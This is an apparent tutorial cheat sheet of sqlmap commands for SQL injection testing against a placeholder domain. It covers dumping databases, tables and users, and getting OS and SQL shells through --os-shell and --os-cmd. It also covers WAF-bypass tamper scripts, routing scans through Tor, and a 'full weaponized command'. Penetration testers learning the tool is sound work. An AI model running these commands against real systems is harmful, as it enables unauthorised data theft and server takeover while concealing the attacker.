# 🐉 SQLMap Cheat Sheet

Looking for a complete sqlmap cheat sheet? This guide covers the most useful sqlmap commands for detecting and exploiting SQL injection vulnerabilities — from basic scans to full database takeover. 

Whether you’re a penetration tester, bug bounty hunter, or CTF player, these ready-to-use sqlmap examples will help you test web applications faster and more effectively.

**sqlmap** is an open-source penetration testing tool that automates SQL injection detection and exploitation across databases like MySQL, PostgreSQL, MSSQL, Oracle, and SQLite. In this cheat sheet, you’ll find practical commands, flags, and real-world payloads you can copy, tweak, and use during engagements or CTFs.

> **Note:** For each command using `--dbms=mysql`. You don’t need to use it if you do not know the type of database, but if you do, it will be faster than the command without this.

---

## 🔍 Enumeration

**Enum DB**
```bash
sqlmap --dbms=mysql -u "[http://takumatest.domain/](http://takumatest.domain/)" --dbs
```

**List Tables**
```bash
sqlmap --dbms=mysql -u "[http://takumatest.domain/](http://takumatest.domain/)" -D target_DB --tables
```
*(Tip: Use `--current-user` to enum current user, and `--current-db` to enum db name)*

**List Columns**
```bash
sqlmap --dbms=mysql -u "[http://takumatest.domain/](http://takumatest.domain/)" -D target_DB -T target_Table --columns
```

**List of Users and Roles**
```bash
sqlmap --dbms=mysql -u "[http://takumatest.domain/](http://takumatest.domain/)" --users --roles --threads=10
```

---

## 🚀 Exploitation & Extraction

**Dump Table**
```bash
sqlmap --dbms=mysql -u "[http://takumatest.domain/](http://takumatest.domain/)" -D target_DB -T target_Table --dump
```

**Dump Limit**
```bash
--start=1 --stop=10
```

**Custom Query**
```bash
sqlmap --dbms=mysql -u "[http://takumatest.domain/](http://takumatest.domain/)" --sql-query="select * from master.sys.server_principals"
```

**Query with Where Condition**
```bash
sqlmap --dbms=mysql -u "[http://takumatest.domain/](http://takumatest.domain/)" -D target_DB -T target_table --where "id>0"
```

---

## 🎯 Target Specification

**Use POST Methods**
```bash
sqlmap --dbms=mysql -u "[http://takumatest.domain/](http://takumatest.domain/)" --data="data1=aaa&data2=bbb"
```

**Specify Parameter**
```bash
sqlmap --dbms=mysql -u "[http://takumatest.domain/param1=value1&param2=value2](http://takumatest.domain/param1=value1&param2=value2)" --dbs -p param2
```

**Specify URIs (REST-style)**
```bash
sqlmap --dbms=mysql -u "[http://takumatest.domain/param1/value1*/param2/value2](http://takumatest.domain/param1/value1*/param2/value2)" --dbs
```

**Specific Point to Inject (Use `*`)**
```bash
sqlmap -u "[http://takumatest.domain/abc/def/123*/data.php](http://takumatest.domain/abc/def/123*/data.php)"
```

**Complex Request (Headers, Cookies, Level/Risk)**
```bash
sqlmap -u "[http://takumatest.domain/](http://takumatest.domain/)" --data="param1=blah&param2=blah" --cookie="JSESSIONID=d02084cbe50e16aa4" --level=5 --risk=3 -p param1
```

---

## 💻 OS & Shell Access

**OS Shell**
```bash
sqlmap --dbms=mysql -u "[http://takumatest.domain/](http://takumatest.domain/)" --os-shell
```

**SQL Shell**
```bash
sqlmap --dbms=mysql -u "[http://takumatest.domain/](http://takumatest.domain/)" --sql-shell
```

**CMD Shell**
```bash
sqlmap --dbms=mysql -u "[http://takumatest.domain/](http://takumatest.domain/)" --os-cmd whoami
```

---

## 🛡️ Evasion & Advanced Techniques

**Basic Authen & NTLM**
```bash
sqlmap -u "[http://takumatest.domain/](http://takumatest.domain/)" --data="param1=value1&param2=value2" -p param1 --auth-type=[basic/ntlm] --auth-cred=username:password
```

**Proxy**
```bash
sqlmap -u "[http://takumatest.domain/](http://takumatest.domain/)" --proxy=http://proxy_address:port
```

**Scan through TOR**
```bash
sqlmap -u "[http://takumatest.domain/](http://takumatest.domain/)" --tor --tor-type=SOCKS5 --check-tor --dbms=mysql --dbs
```

**Bypass WAF (Example)**
```bash
--tamper="between,randomcase,space2comment"
```

**Injection Techniques**
```bash
--technique=BEUST
```
* **B**: Boolean blind
* **E**: Error based
* **U**: Union query based
* **S**: Stacked queries
* **T**: Time based blind

---

## ⚙️ Optimization & Workflow

**Automate the Process (Always answer 'Y')**
```bash
--batch
```

**Clear Cache & Fresh Queries**
```bash
--fresh-queries
--flush-session
```

**Example: Full Weaponized Command**
```bash
sqlmap -r file-request.txt --random-agent --threads=10 --technique=B --level=3 --batch -D target_DB -T target_table --fresh-queries --count
```
